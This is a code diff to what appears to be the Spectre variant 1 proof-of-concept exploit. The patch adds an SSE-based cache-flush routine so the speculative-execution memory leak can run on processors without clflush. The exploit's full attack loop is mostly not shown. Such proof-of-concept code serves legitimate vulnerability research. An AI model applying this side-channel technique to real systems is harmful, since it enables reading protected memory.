@@ -57,6 +57,22 @@ void victim_function(size_t x) {
   }
 }
 
+#ifdef NOCLFLUSH
+/* Flush memory using long SSE instructions */
+void flush_memory_sse(uint8_t * addr)
+{
+  float * p = (float *)addr;
+  float c = 0.f;
+  __m128 i = _mm_setr_ps(c, c, c, c);
+
+  int k, l;
+  /* Non-sequential memory addressing by looping through k by l */
+  for (k = 0; k < 4; k++)
+    for (l = 0; l < 4; l++)
+      _mm_stream_ps(&p[(l * 4 + k) * 4], i);
+}
+#endif
+
 /********************************************************************
 Analysis code
 ********************************************************************/
@@ -83,9 +99,17 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     results[i] = 0;
   for (tries = 999; tries > 0; tries--) {
 
+#ifndef NOCLFLUSH
     /* Flush array2[256*(0..255)] from cache */
     for (i = 0; i < 256; i++)
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
+#else
+    /* Flush array2[256*(0..255)] from cache
+       using long SSE instruction several times */
+    for (j = 0; j < 16; j++)
+      for (i = 0; i < 256; i++)
+        flush_memory_sse( & array2[i * 512]);
+#endif
 
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
     training_x = tries % array1_size;
